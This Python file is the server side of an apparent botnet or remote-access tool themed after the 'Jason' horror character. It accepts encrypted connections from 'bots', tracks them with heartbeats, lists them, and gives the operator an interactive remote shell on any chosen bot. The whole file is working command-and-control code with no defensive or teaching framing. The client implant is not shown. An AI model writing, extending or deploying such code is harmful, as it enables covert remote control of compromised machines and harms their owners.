import socket
import end2end
import time
import threading
import fade
import os
import getpass
import sys

logo = """ ▄▄▄██▀▀▀▄▄▄        ██████  ▒█████   ███▄    █ 
   ▒██  ▒████▄    ▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ 
   ░██  ▒██  ▀█▄  ░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒
▓██▄██▓ ░██▄▄▄▄██   ▒   ██▒▒██   ██░▓██▒  ▐▌██▒
 ▓███▒   ▓█   ▓██▒▒██████▒▒░ ████▓▒░▒██░   ▓██░
 ▒▓▒▒░   ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
 ▒ ░▒░    ▒   ▒▒ ░░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
 ░ ░ ░    ░   ▒   ░  ░  ░  ░ ░ ░ ▒     ░   ░ ░ 
 ░   ░        ░  ░      ░      ░ ░           ░ """

help_menu = """Usage python3 server.py
\tlc: lists all connected clients
\tsh: shell, use -i to select ID
\tremove: removes bot, use -i to select ID
\texit: exits the program"""

class Freddy:
    def __init__(self):
        self.host = "192.168.0.169"
        self.port_init = 61346
        self.port_heartbeat = 61347
        self.sock_init = None
        self.sock_heartbeat = None
        self.clients = {}  # Dictionary to store client sockets with IP addresses
        self.client_shells = {}
        self.removed = None

    def server_init(self):
        while True:
            try:
                # Initialize main socket
                self.sock_init = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock_init.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.sock_init.bind((self.host, self.port_init))
                self.sock_init.listen()
                
                # Initialize heartbeat socket
                self.sock_heartbeat = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock_heartbeat.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.sock_heartbeat.bind((self.host, self.port_heartbeat))
                self.sock_heartbeat.listen()

                threading.Thread(target=self.handle_connections).start()
                self.clear()
                print("[+] Server successfully initialized")
                getpass.getpass("Press Enter To Continue To Panel...")
                self.menu()
                break
            except Exception as e:
                print("[+] Failed To Create Socket Server Trying Again In 5")
                print(e)
                self.close_sockets()
                time.sleep(5)

    def close_sockets(self):
        if self.sock_init:
            self.sock_init.close()
            self.sock_init = None
        if self.sock_heartbeat:
            self.sock_heartbeat.close()
            self.sock_heartbeat = None

    def handle_connections(self):
        while True:
            client_socket, addr = self.sock_init.accept()
            threading.Thread(target=self.handle_client, args=(client_socket, addr)).start()

    def handle_client(self, client_socket, addr):
        secure_sock = end2end.createComunicator(client_socket, 2048)
        try:
            init_message = str(secure_sock.recv().decode())
            if init_message[0:6] == "!INIT!":
                if addr[0] not in self.clients:  # Store only the initial socket for each client
                    self.clients[addr[0]] = client_socket
                    secure_sock.send(str("!INITIALIZED!").encode())
                    threading.Thread(target=self.handle_heartbeat, args=(addr,)).start()
                else:
                    secure_sock.send(str("!KILL!").encode())
                    return
            else:
                secure_sock.send(str("!KILL!").encode())
                return
        except Exception as e:
            print(f"Error handling client {addr}: {e}")
            client_socket.close()

    def handle_heartbeat(self, addr):
        while True:
            heartbeat_socket, heartbeat_addr = self.sock_heartbeat.accept()
            if heartbeat_addr[0] == addr[0]:  # Ensure heartbeat is from the correct client
                threading.Thread(target=self.heart_beat, args=(heartbeat_socket, addr)).start()

    def heart_beat(self, heartbeat_socket, addr):
        secure_sock = end2end.createComunicator(heartbeat_socket, 2048)
        for idx, (ip, socket) in enumerate(self.clients.items()):
            if ip == addr[0]:
                client_id = idx
        while True and client_id != self.removed:
            try:
                secure_sock.send("!HEARTBEAT!".encode())
                try:
                    msg = secure_sock.recv().decode(errors='replace')
                    if msg == "!CRYSTAL-LAKE!":
                        time.sleep(1)
                    else:
                        heartbeat_socket.close()
                        for key, value in list(self.client_shells.items()):
                            if self.clients[addr[0]] == key:
                                del self.client_shells[key]
                        del self.clients[addr[0]]  # Remove all sockets associated with the client's IP
                        break
                except UnicodeDecodeError:
                    print(f"Decode error in heart_beat from {addr}")
                    heartbeat_socket.close()
                    for key, value in list(self.client_shells.items()):
                        if self.clients[addr[0]] == key:
                            del self.client_shells[key]
                    del self.clients[addr[0]]
                    break
            except Exception as e:
                print(f"Exception in heart_beat: {e}")
                heartbeat_socket.close()
                for key, value in list(self.client_shells.items()):
                    if self.clients[addr[0]] == key:
                        del self.client_shells[key]
                del self.clients[addr[0]]  # Remove all sockets associated with the client's IP
                break
        secure_sock.send("!KILL!".encode())
        self.removed = None
    
    def remove(self, client_index):
        # Check if there are clients and if the client_index exists
        if len(self.clients) == 0:
            print("No clients to remove.")
            return
        if client_index < 0 or client_index >= len(self.clients):
            print("Invalid client index.")
            return
        self.removed = client_index

        # Get the IP address of the client to be removed
        ip_to_remove = list(self.clients.keys())[client_index]
        
        # Close the client socket and remove it from client_shells and clients
        if ip_to_remove in self.clients:
            client_socket = self.clients[ip_to_remove]
            client_socket.close()
            
            # Remove from client_shells if it exists there
            if client_socket in self.client_shells:
                del self.client_shells[client_socket]
            
            # Remove from clients
            del self.clients[ip_to_remove]
            
            print(f"Client {client_index} ({ip_to_remove}) removed successfully.")
        else:
            print("Client not found.")


    def shutdown(self):
        print("Shutting down server...")
        self.close_sockets()
        os._exit(0)

    def clear(self):
        # Clear the screen based on the operating system
        os.system('cls' if os.name == 'nt' else 'clear')

    def list_clients(self):
        print("")
        print("\033[38;2;128;0;128mID\t\t|\t\tIP\t\t|\tPORT\033[0m")
        print("\033[38;2;128;0;128m" + str(("-" * 16) + "|" + ("-" * 31) + "|" + ("-" * 20)) + "\033[0m")  # 85 dashes to span the length of the header
        for idx, (ip, socket) in enumerate(self.clients.items()):
            port = socket.getsockname()[1]
            print(f"\033[38;2;128;0;128m{idx}\t\t|\t  {ip}\t\t|\t{port}\t\033[0m")
        print("")

    def shell(self, client_id):
        try:
            secure = None
            for idx, (ip, socket) in enumerate(self.clients.items()):
                if idx == client_id:
                    sock = socket
            for idx, (ip, socket) in enumerate(self.clients.items()):
                if idx == client_id:
                    if client_id == self.removed:
                        return
            sock.send("1".encode("utf-8"))
            time.sleep(0.2)
            if sock in self.client_shells:
                secure = self.client_shells[sock]
                secure.send("!INIT-SHELL!".encode())
                time.sleep(1)
            else:
                secure = end2end.createComunicator(sock, 2048)  # Store this shell for this sock in clients_shell
                self.client_shells[sock] = secure
                secure.send("!INIT-SHELL!".encode())
                time.sleep(1)
            end = False
            while True and end == False:
                secure.send("!PWD-SHELL!".encode())
                try:
                    usr = str(secure.recv().decode(errors='replace'))
                    pwd = str(secure.recv().decode(errors='replace'))
                except UnicodeDecodeError:
                    print("Decode error in shell")
                    break
                cmd = input("bot@" + str(usr) + ":" + str(pwd) + "$ ")
                if cmd == "!exit":
                    end = True
                    secure.send("!EXIT-SHELL!".encode())
                    secure = None
                    break
                else:
                    secure.send(cmd.encode())
                    try:
                        output = secure.recv().decode()
                        if output == "!PACKET-SENDER!":
                            secure.send("!PACKET-SENDER-CONFIRM!".encode())
                            packets = int(str(secure.recv().decode()))
                            output_packet = []
                            for i in range(0, packets):
                                data = secure.recv().decode()
                                output_packet.append(str(data))
                            full_output = """"""
                            for x in output_packet:
                                full_output += str(x)
                            print(full_output)
                        else:
                            print(output)
                    except UnicodeDecodeError:
                        print("Decode error in shell command output")
                        output = ""
        except:
            secure.send("!EXIT-SHELL!".encode())
            print("\n")

    def menu(self):
        self.clear()
        logo_color = fade.purplepink(logo)
        menu_color = fade.purplepink(help_menu)
        print(logo_color)
        while True:
            i = input(f"\033[38;2;128;0;128madmin@jason:~$\033[0m ")
            try:
                i = str(i)
                if i.lower() == "lc":
                    self.list_clients()
                elif "sh " in i.lower() and " -i " in i.lower():
                    client = i.replace("sh ", "").replace("-i ", "")
                    try:
                        client = int(client)
                        if client >= 0 and client <= (len(self.clients)-1):
                            self.shell(client)
                    except:
                        print("\nMake sure the ID is a number and client exists! ex: -i 5\n")
                elif "remove " in i.lower() and " -i " in i.lower():
                    client = i.replace("remove ", "").replace("-i ", "")
                    try:
                        client = int(client)
                        if client >= 0 and client <= (len(self.clients)-1):
                            self.remove(client)
                    except:
                        print("\nMake sure the ID is a number and client exists! ex: -i 5\n")
                elif i.lower() == "clear" or i.lower() == "cls":
                    self.clear()
                elif i.lower() == "help":
                    print(menu_color)
                elif i.lower() == "exit":
                    self.shutdown()
                else:
                    print(f"\n{i} is not a recognized command! type 'help' for a list of commands\n")
            except Exception as e:
                print("Error in menu: " + str(e))

if __name__ == "__main__":
    server = Freddy()
    server.server_init()
